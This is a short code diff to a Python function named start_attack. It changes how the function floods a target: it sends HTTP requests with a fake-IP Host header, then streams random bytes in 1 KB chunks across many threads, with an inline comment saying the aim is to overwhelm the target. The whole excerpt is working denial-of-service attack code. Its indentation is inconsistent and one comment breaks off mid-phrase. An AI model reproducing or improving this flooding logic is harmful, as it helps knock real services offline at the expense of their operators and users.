@@ -20,8 +20,14 @@ def start_attack():
         host_header = f"Host: {fake_ip}\r\n"
         payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
         s.send(payload.encode())
-        s.send(os.urandom(int(num_bytes)))
-        
+    
+    # Send a large number of random bytes multiple times to overwhelm the target
+        for _ in range(int(num_bytes) // 1024):  # Send in chunks of 1KB
+            s.send(os.urandom(1024))
+        remaining_bytes = int(num_bytes) % 1024
+        if remaining_bytes > 0:
+            s.send(os.urandom(remaining_bytes))
+        s.close()  # Close the    
 
     for _ in range(int(data.get('threads', 10))):
         for _ in range(int(num_attacks)):
